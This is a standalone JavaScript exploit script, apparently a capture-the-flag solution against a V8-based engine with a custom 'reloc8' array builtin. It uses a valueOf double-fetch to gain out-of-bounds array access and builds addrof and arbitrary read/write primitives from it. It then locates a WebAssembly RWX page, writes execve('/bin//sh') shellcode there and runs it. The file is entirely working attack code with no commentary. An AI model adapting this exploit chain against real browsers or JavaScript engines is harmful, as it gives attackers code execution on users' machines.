var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

function ftoi(v) {
    f64_buf[0] = v;
    return (BigInt(u32_buf[1]) << 32n) | BigInt(u32_buf[0]);
}

function itof(v) {
    u32_buf[0] = Number(v & 0xffffffffn);
    u32_buf[1] = Number(v >> 32n);
    return f64_buf[0];
}

let arr = [1.1, 2.2, 3.3, 4.4];

function make_arg(a, b) {
    let seen = false;
    return {
        valueOf() {
            if (!seen) {
                seen = true;
                return a;
            }
            return b;
        }
    };
}

function reloc_copy_raw(from_check, from_use, to_check, to_use) {
    const from = make_arg(from_check, from_use);
    const to = make_arg(to_check, to_use);
    arr.reloc8(from, to);
}

function oob_read(idx) {
    reloc_copy_raw(0, idx, 1, 0);
    return arr[0];
}

function oob_write(idx, val) {
    arr[0] = val;
    reloc_copy_raw(0, 0, 1, idx);
}

var float_arr = [1.5, 2.5];
var initial_obj = {a:1, a:2};
var obj_arr = [initial_obj];

const header_float_val = oob_read(12);
const header_obj_val   = oob_read(22);

function addrof(obj) {
    obj_arr[0] = obj;
    oob_write(22, header_float_val);
    let leak = obj_arr[0];
    oob_write(22, header_obj_val);
    let bits = ftoi(leak);
    return bits & 0xffffffffn;
}


let victim = new Uint32Array(0); 

let cagebase = ftoi(oob_read(82)) <<32n & 0xffffffff00000000n;
console.log("cage @ 0x" + cagebase.toString(16));

let bigvictim = new ArrayBuffer(0x100);
let dview = new DataView(bigvictim);

let bkk = oob_read(136);
console.log("backin @ " + ftoi(bkk).toString(16));

function set_backing(addr) {
    oob_write(136, itof(addr));
}

function read(cageaddr){
    set_backing(cagebase | BigInt(cageaddr));
    return dview.getBigUint64(0, true);
}
function read32(cageaddr){
    set_backing(cagebase | BigInt(cageaddr));
    return dview.getUint32(0, true);
}

function write(cageaddr, val){
    set_backing(cagebase | BigInt(cageaddr));
    dview.setBigUint64(0, val, true);
}

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

let wasm_addr = addrof(wasm_instance) -1n;
let trusted_data = read32(Number(wasm_addr) + 12);

console.log("wasm_instance @ 0x" + wasm_addr.toString(16));
console.log("trusted_data @ 0x" + trusted_data.toString(16));

let rwx_addr = read(trusted_data -1 + 8*5);

console.log("rwx_addr @ 0x" + rwx_addr.toString(16));

set_backing(rwx_addr);

let shellcode=[0x50c03148,0x2f2fbf48,0x2f6e6962,0x48576873,0x3148e789,0xd23148f6,0x050f3bb0];
for (let i = 0; i < shellcode.length; i++) {
    dview.setUint32(i*4, shellcode[i], true);
}

f();